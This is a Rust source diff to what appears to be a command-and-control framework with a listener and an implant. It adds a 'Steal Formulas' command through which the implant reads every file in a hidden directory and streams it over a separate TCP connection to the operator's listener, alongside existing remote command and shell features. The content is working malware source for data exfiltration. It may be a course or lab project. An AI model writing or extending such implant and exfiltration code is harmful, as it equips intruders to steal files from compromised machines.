@@ -20,7 +20,7 @@ mod usr_mods;
 
 /* IMPORTS
  */
-
+use portal_lib::{Portal,Direction, TransferInfo, TransferInfoBuilder};
 use std::process::Command;
 use std::net::{UdpSocket, SocketAddr, TcpListener, TcpStream, Shutdown};
 use std::io::{Read, Write};
@@ -30,7 +30,7 @@ use std::time::Duration;
 use std::thread;
 use std::path::Path;
 use std::str;
-
+use std::fs;
 /*****************************/
 /*     USEFUL STRUCTURES     */
 /*****************************/
@@ -306,6 +306,11 @@ fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<Share
                         }
                     }
                 },
+
+                7 => {
+                    println!("[!] Sending files over UDP is unsafe");
+                    println!("[!] Try using this with a TCP connection");
+                },
                 // anything else, do nothing
                 // sleeps for 10ms to allow time for client to unlock mutex if needed
                 _u8 => {
@@ -323,18 +328,28 @@ fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<Share
 // 4 => Send a single command for the implant to execute
 // 5 => Start up a shell
 // 6 => Have the implant execute a module
+// 7 => Steal Formulas
 // anything else => do nothing (sleep for 10 ms to allow client to unlock shared buffer)
 fn interact_tcp(lsn: &mut Listener, stream: &mut TcpStream, sb: &mut Arc<Mutex<SharedBuffer>>) {
     println!("\n[+] Connection established by listener {}", lsn.id + 1);
     let mut is_interacting: bool = false;
+    //Added steal_flag to break out of file exfil
+    let mut steal_flag: bool = false;
     let mut memo: String = String::new();
     loop {
         // live interaction with client
-        if is_interacting {
+        if is_interacting || steal_flag {
+            let mut cc: u8 = 0;
+            if steal_flag{
+                cc = 101;
+            }
+            else{
+                cc = rcv_client_command(lsn, sb);
+            }
             // checks if client is terminating interaction with target_src
-            let cc: u8 = rcv_client_command(lsn, sb);
             if cc == 69 {
                 is_interacting = false;
+                steal_flag = false;
                 let code: u8 = 69;
                 let bytes = stream.write(&[code; 1]).unwrap();
             }
@@ -342,6 +357,7 @@ fn interact_tcp(lsn: &mut Listener, stream: &mut TcpStream, sb: &mut Arc<Mutex<S
                 let code: u8 = 4;
                 let bytes = stream.write(&[code; 1]).unwrap();
                 is_interacting = false;
+                steal_flag = false;
             }
             // otherwise interact normally
             else {
@@ -442,6 +458,50 @@ fn interact_tcp(lsn: &mut Listener, stream: &mut TcpStream, sb: &mut Arc<Mutex<S
                         else {
                             thread::sleep(Duration::from_millis(10));
                         }
+                    }
+                }
+                7 => {
+                    println!("Stealing Files from secret directory!");
+                    // 5 to signify file exfil
+                    let code: u8 = 5;
+                    stream.write(&[code; 1]).unwrap();
+
+                    //Create Separate Listener
+                    let mut moved_addr = stream.local_addr().unwrap().clone();
+                    moved_addr.set_port(11111);
+                    let listen = TcpListener::bind(moved_addr).unwrap();
+                    match listen.accept(){
+                        Ok((mut secret_stream, secret_addr)) => {
+                            //Open File portal
+                            let mut portal = Portal::init(Direction::Receiver, "exfil".into(), "secretformulas!".into()).unwrap();
+                            portal.handshake(&mut secret_stream);
+                            // CrustyCrab/.stolen_formulas == Destination
+                            let download_folder = Path::new("./.stolen_formulas");
+                            for metadata in portal.incoming(&mut secret_stream, Some(confirm_download)).unwrap(){
+                                portal.recv_file(&mut secret_stream, download_folder, Some(&metadata), Some(progress));
+                                println!("\nReceiving {:?}", metadata);
+                            }
+                        },
+                        Err(e) => println!("Error Accepting Connection")
+                    }
+
+                    //Ensure file downloading is finished
+                    is_interacting = false;
+                    let mut bytes = 0;
+                    let mut output = [0; 32768];
+                    while bytes == 0 {
+                        output = [0; 32768];
+                        bytes = match stream.read(&mut output) {
+                            Ok(b) => b,
+                            Err(e) => 0,
+                        };
+                    }
+                    //Signify finish by setting steal_flag to true
+                    if String::from_utf8_lossy(&output).contains("Finished"){
+                        println!("Finished exfil\n(Enter to Continue)");
+                        let code: u8 = 4;
+                        stream.write(&[code; 1]).unwrap();
+                        steal_flag = true;
                     }
                 }
                 _u8 => {
@@ -762,6 +822,7 @@ fn imp_tcp(address: SocketAddr) {
         if bytes != 0 {
             match cc[0] {
                 // execute single line cmd
+                
                 1 => {
                     buffer = [0; 32768];
                     let bytes = match sock.read(&mut buffer) {
@@ -787,6 +848,39 @@ fn imp_tcp(address: SocketAddr) {
                 },
                 //Do nothing
                 4 => {},
+                5 => {
+                    println!("Exfiling Files!");
+                    let thr = thread::spawn(move ||
+                        {
+                            //Open portal for file transfer
+                            let mut portal = Portal::init(Direction::Sender, "exfil".into(), "secretformulas!".into()).unwrap();
+                            //Connect to secret addr
+                            let mut secret_addr = address.clone();
+                            secret_addr.set_port(11111);
+                            let mut secret_stream = TcpStream::connect_timeout(&secret_addr, Duration::from_millis(10000)).unwrap();
+                            //Handshake to confirm portal connection
+                            portal.handshake(&mut secret_stream).unwrap();
+                            //Use relative path of hidden folder 
+                            let mut paths = fs::read_dir("./.secret_formulas").unwrap();
+                            //Create transfer info for file names
+                            let mut info = TransferInfo::empty();
+                            for mut path in paths {
+                                let temp_path = path.expect("PATH ERR").path().as_path().to_string_lossy().into_owned();
+                                let file = Path::new(&temp_path);
+                                info.add_file(file);
+                            }
+                            //Exfil files
+                            for (fullpath, metadata) in portal.outgoing(&mut secret_stream, &info).unwrap(){
+                                portal.send_file(&mut secret_stream, fullpath, Some(progress));
+                                println!("Sending {:?}", metadata);
+                            }
+                        }
+                    );
+                    //Send Finished when complete to return to normal
+                    thr.join().unwrap();
+                    let ret_mess = "Finished";
+                    sock.write(ret_mess.as_bytes()).unwrap();
+                },
                 _u8 => todo!(),
             }
         }
@@ -813,3 +907,10 @@ pub fn get_system_addr() -> SocketAddr {
     // replace this with code to find system address
     return SocketAddr::from(([127, 0, 0, 1], 1337));
 }
+
+
+// Functions for portal
+fn progress(transferred: usize) {
+    // println!("sent {:?} bytes", transferred);
+}
+fn confirm_download(_info: &TransferInfo) -> bool { true }
